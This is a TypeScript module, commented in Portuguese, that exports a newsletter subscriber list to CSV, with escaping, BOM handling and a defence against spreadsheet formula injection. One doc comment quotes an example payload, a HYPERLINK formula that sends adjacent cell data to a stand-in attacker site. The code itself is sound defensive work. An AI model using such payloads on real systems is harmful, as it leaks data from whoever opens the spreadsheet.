/**
 * A exportação da lista em CSV.
 *
 * Módulo puro porque o CSV é fácil de escrever errado de um jeito que só
 * aparece na planilha de outra pessoa: um nome com vírgula quebra a coluna, um
 * nome com aspas quebra a linha, e um endereço começando com "=" vira fórmula
 * ao abrir no Excel.
 */

/**
 * Escapa um campo.
 *
 * Duas coisas acontecem aqui, e a segunda é de segurança:
 *
 *  1. O escape do CSV (RFC 4180): campo com vírgula, aspas ou quebra de linha
 *     vai entre aspas, e aspas internas viram duplas.
 *
 *  2. A defesa contra injeção de fórmula. Excel e Google Sheets executam
 *     qualquer célula que comece com = + - @ ou tab. Um nome cadastrado como
 *     `=HYPERLINK("http://sitedoatacante/"&A1,"clique")` viraria um link vivo
 *     na planilha de quem exportou, carregando o dado da linha ao lado. Como
 *     esses campos vêm de um formulário público, isto não é hipótese: é a
 *     forma conhecida de atacar quem exporta. A aspa simples na frente
 *     neutraliza sem alterar o que a pessoa lê.
 */
export function campoCsv(valor: unknown): string {
  const texto = valor === null || valor === undefined ? '' : String(valor)
  const seguro = /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto
  return /[",\n\r;]/.test(seguro) ? `"${seguro.replace(/"/g, '""')}"` : seguro
}

export type LinhaExportada = {
  email: string
  nome: string
  estado: string
  origem: string
  created_at: string
  confirmado_em: string | null
  descadastrado_em: string | null
  consentimento_texto: string
  consentimento_ip: string | null
}

const COLUNAS = [
  ['E-mail', (l: LinhaExportada) => l.email],
  ['Nome', (l: LinhaExportada) => l.nome],
  ['Situação', (l: LinhaExportada) => rotuloDoEstado(l.estado)],
  ['Origem', (l: LinhaExportada) => l.origem],
  ['Inscrição', (l: LinhaExportada) => data(l.created_at)],
  ['Confirmação', (l: LinhaExportada) => data(l.confirmado_em)],
  ['Saída', (l: LinhaExportada) => data(l.descadastrado_em)],
  ['Consentimento (texto aceito)', (l: LinhaExportada) => l.consentimento_texto],
  ['Consentimento (IP)', (l: LinhaExportada) => l.consentimento_ip ?? ''],
] as const

export function rotuloDoEstado(estado: string): string {
  return { pendente: 'Aguardando confirmação', confirmado: 'Confirmado', descadastrado: 'Saiu da lista', invalido: 'Endereço inválido' }[estado] ?? estado
}

function data(iso: string | null): string {
  if (!iso) return ''
  const d = new Date(iso)
  return Number.isNaN(d.getTime()) ? '' : d.toISOString().slice(0, 19).replace('T', ' ')
}

/**
 * Monta o CSV inteiro.
 *
 * Vai com BOM porque o Excel em português abre UTF-8 sem BOM como Latin-1, e
 * "João da Conceição" chega como "JoÃ£o da ConceiÃ§Ã£o" na tela de quem pediu
 * o arquivo. Separador ponto e vírgula pela mesma razão: o Excel configurado
 * em pt-BR usa a vírgula como decimal e não separa colunas por ela.
 */
export function montarCsv(linhas: LinhaExportada[]): string {
  const cabecalho = COLUNAS.map(([titulo]) => campoCsv(titulo)).join(';')
  const corpo = linhas.map((l) => COLUNAS.map(([, ler]) => campoCsv(ler(l))).join(';'))
  return '﻿' + [cabecalho, ...corpo].join('\r\n') + '\r\n'
}

/** Nome do arquivo, com a data para os exports não se sobrescreverem. */
export function nomeDoArquivo(agora = new Date()): string {
  return `newsletter-cvrj-${agora.toISOString().slice(0, 10)}.csv`
}
